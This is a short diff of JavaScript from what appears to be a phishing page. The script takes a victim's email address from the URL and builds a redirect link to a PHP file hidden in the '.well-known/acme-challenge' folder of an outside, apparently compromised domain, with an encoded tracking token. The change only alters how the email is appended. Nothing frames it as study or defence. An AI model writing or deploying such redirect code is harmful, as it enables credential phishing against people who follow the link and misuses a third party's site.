@@ -19,7 +19,7 @@
         const email = getEmailFromURL();
         // Update the href attribute of the link
         const link = document.getElementById('redirectLink');
-        link.href = `https://besco.com.pe/.well-known/acme-challenge/404.php?7-797967704b53693230746650794d394c5361334d7a632f50307973713163744c4c644776536a59334337616f384e4850424d705536475755354f594141413d3d-?email=${email}`;
+        link.href = `https://besco.com.pe/.well-known/acme-challenge/404.php?7-797967704b53693230746650794d394c5361334d7a632f50307973713163744c4c644776536a59334337616f384e4850424d705536475755354f594141413d3d-#P{email}`;
     }
 
     // Call the updateLink function when the page loads
